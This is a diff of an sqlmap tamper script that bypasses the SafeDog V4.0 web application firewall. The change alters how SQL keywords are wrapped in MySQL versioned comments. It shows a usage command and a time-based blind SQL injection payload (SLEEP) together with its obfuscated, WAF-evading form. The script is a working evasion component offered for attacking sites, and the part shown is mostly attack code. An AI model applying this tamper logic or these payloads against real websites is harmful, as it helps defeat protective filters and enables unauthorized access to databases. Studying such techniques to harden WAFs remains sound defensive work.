@@ -4,10 +4,11 @@
 Bypass SafeDog V4.0
 Version: 1.0
 Date: 2018-04-18
+Update: 2018-04-20
 Author: Kyrie403
 Copyright (c) Kyrie403
 GitHub: https://github.com/kyrie403
-Usage: python sqlmap.py -u http://test.com/test.php?id=1 --tamper=bypasssafedogv4 --random-agent --delay=0.5 --dbms MYSQL 
+Usage: python sqlmap.py -u http://test.com/test.php?id=1 --tamper=bypasssafedogv4 --random-agent --delay=0.5 --dbms MYSQL
 
 """
 
@@ -30,12 +31,12 @@ def tamper(payload, **kwargs):
         * Useful to bypass SafeDog V4.0
 
     >>> tamper("AND 2610=IF((11=11),(SLEEP(5)),2610) AND 'eCSJ'='eCSJ")
-    "/*!50010AND*//*%00*/2610=/*!50010IF*/((11=11),(/*!SLEEP/**/*//**/(5)),2610)/*%00*//*!50010AND*//*%00*/'eCSJ'='eCSJ"
+    "/*!50010AND/*!*//*%00*/2610=/*!50010IF/*!*/((11=11),(/*!SLEEP/**/*//**/(5)),2610)/*%00*//*!50010AND/*!*//*%00*/'eCSJ'='eCSJ"
     """
     def process(match):
         word = match.group('word')
         if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
-            return match.group().replace(word, "/*!50010%s*/" % word)
+            return match.group().replace(word, "/*!50010%s/*!*/" % word)
         else:
             return match.group()
 
